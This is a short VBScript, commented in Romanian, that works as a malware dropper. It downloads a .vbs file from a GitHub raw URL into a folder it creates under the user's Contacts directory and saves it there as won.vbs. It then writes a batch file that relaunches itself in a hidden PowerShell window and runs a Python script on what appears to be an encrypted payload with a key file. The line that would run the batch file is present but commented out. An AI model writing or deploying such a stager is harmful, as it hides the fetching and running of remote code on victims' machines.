Dim shell, fso, appDataPath, targetFolder, batContent, xmlHttp

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Obține calea către directorul APPDATA
appDataPath = shell.ExpandEnvironmentStrings("%APPDATA%")
targetFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Contacts\zo"

' Asigură-te că directorul țintă există
If Not fso.FolderExists(targetFolder) Then
    fso.CreateFolder(targetFolder)
End If

' Descarcă fișierul won.vbs de pe GitHub
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file.vbs", False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    ' Salvează fișierul descărcat
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xmlHttp.ResponseBody
    stream.SaveToFile targetFolder & "\won.vbs", 2
    stream.Close
End If

' Creează fișierul a.txt (gol)
fso.CreateTextFile(targetFolder & "\a.txt").Close

' Creează fișierul b.txt (gol) 
fso.CreateTextFile(targetFolder & "\b.txt").Close

' Conținutul pentru start.bat
batContent = "@echo off" & vbCrLf & _
             "if not ""%~1""==""h"" (" & vbCrLf & _
             "    powershell -windowstyle hidden -command ""Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden""" & vbCrLf & _
             "    exit /b" & vbCrLf & _
             ")" & vbCrLf & _
             "set ""target=%USERPROFILE%\Contacts\zo""" & vbCrLf & _
             "" & vbCrLf & _
             "cd /d ""%target%""" & vbCrLf & _
             "python.exe sh.py -i voo.bin -k x.txt"

' Creează fișierul start.bat
Dim batFile
Set batFile = fso.CreateTextFile(targetFolder & "\start.bat")
batFile.Write batContent
batFile.Close

' Execută fișierul start.bat (opțional)
' shell.Run "cmd /c """ & targetFolder & "\start.bat""", 0, False
